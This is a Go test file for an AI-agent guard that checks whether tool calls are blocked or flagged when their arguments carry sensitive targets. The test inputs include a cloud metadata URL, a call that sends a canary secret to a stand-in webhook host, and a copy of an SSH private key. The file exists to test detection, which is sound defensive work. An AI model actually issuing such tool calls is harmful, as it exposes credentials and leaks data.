package agentguard

import (
	"context"
	"testing"

	"github.com/yangjiyj/aiguard/packages/shared-go/protection"
)

// blockingProtectionsPolicy 把全部敏感目标防护项配成阻断：2.9.22 起分析器只记命中，
// “判为阻断”取决于防护项配置；默认配置下同一命中只告警。
func blockingProtectionsPolicy() *EffectivePolicy {
	return &EffectivePolicy{Mode: ModeStrict, Protections: blockingProtections(protection.GroupAgentTarget)}
}

// W5 5.8: targets and secrets under non-standard or nested keys are inspected.
func TestWS5NetworkToolInspectsAllStringArguments(t *testing.T) {
	input := ToolCallAnalysisInput{
		ToolName: "http_client", ToolType: "network",
		Arguments: map[string]any{"options": map[string]any{"location": "http://169.254.169.254/latest/meta-data"}},
		Mode:      ModeAudit, Policy: blockingProtectionsPolicy(),
	}
	decision := AnalyzeToolCall(context.Background(), input)
	if decision.RawDecision != DecisionBlock {
		t.Fatalf("nested metadata URL must be judged block when configured, got %#v", decision)
	}
	input.Policy = nil
	if byDefault := AnalyzeToolCall(context.Background(), input); byDefault.ProtectionItem != "agent.cloud_metadata" {
		t.Fatalf("nested metadata URL must still be detected by default, got %#v", byDefault)
	}

	secret := AnalyzeToolCall(context.Background(), ToolCallAnalysisInput{
		ToolName: "send_data", ToolType: "network",
		Arguments: map[string]any{"url": "https://webhook.example/collect", "message": map[string]any{"text": "canary-agent-exfil-token"}},
		Mode:      ModeAudit, Policy: blockingProtectionsPolicy(),
	})
	if secret.RawDecision != DecisionBlock || secret.Reason != reasonHighConfidenceSecretOut {
		t.Fatalf("secret under a non-standard key must be judged block when configured, got %#v", secret)
	}
}

func TestWS5FileToolInspectsAllStringArguments(t *testing.T) {
	input := ToolCallAnalysisInput{
		ToolName: "fs_tool", ToolType: "file",
		Arguments: map[string]any{"source": "/home/app/.ssh/id_rsa", "mode": "copy"},
		Mode:      ModeAudit, Policy: blockingProtectionsPolicy(),
	}
	decision := AnalyzeToolCall(context.Background(), input)
	if decision.RawDecision != DecisionBlock {
		t.Fatalf("SSH key under a non-standard key must be judged block when configured, got %#v", decision)
	}
	input.Policy = nil
	if byDefault := AnalyzeToolCall(context.Background(), input); byDefault.ProtectionItem != "agent.ssh_private_key" {
		t.Fatalf("SSH key under a non-standard key must still be detected by default, got %#v", byDefault)
	}
	benign := AnalyzeToolCall(context.Background(), ToolCallAnalysisInput{
		ToolName: "fs_tool", ToolType: "file",
		Arguments: map[string]any{"source": "/repo/README.md", "note": "see https://docs.example.com/a"},
		Mode:      ModeAudit,
	})
	if benign.RawDecision == DecisionBlock {
		t.Fatalf("benign arguments must not block, got %#v", benign)
	}
}

func TestWS5CollectStringArgumentsIsBounded(t *testing.T) {
	args := map[string]any{}
	for i := 0; i < maxScannedArgumentValues*2; i++ {
		args[string(rune('a'+i%26))+string(rune('a'+i/26%26))+string(rune('a'+i/676))] = "v"
	}
	if got := len(collectStringArguments(args)); got != maxScannedArgumentValues {
		t.Fatalf("scan must stop at %d values, got %d", maxScannedArgumentValues, got)
	}
	deep := map[string]any{}
	cursor := deep
	for i := 0; i < maxScannedArgumentDepth+4; i++ {
		next := map[string]any{}
		cursor["n"] = next
		cursor = next
	}
	cursor["leaf"] = "http://169.254.169.254/"
	if got := collectStringArguments(deep); len(got) != 0 {
		t.Fatalf("scan must stop at depth %d, got %#v", maxScannedArgumentDepth, got)
	}
}
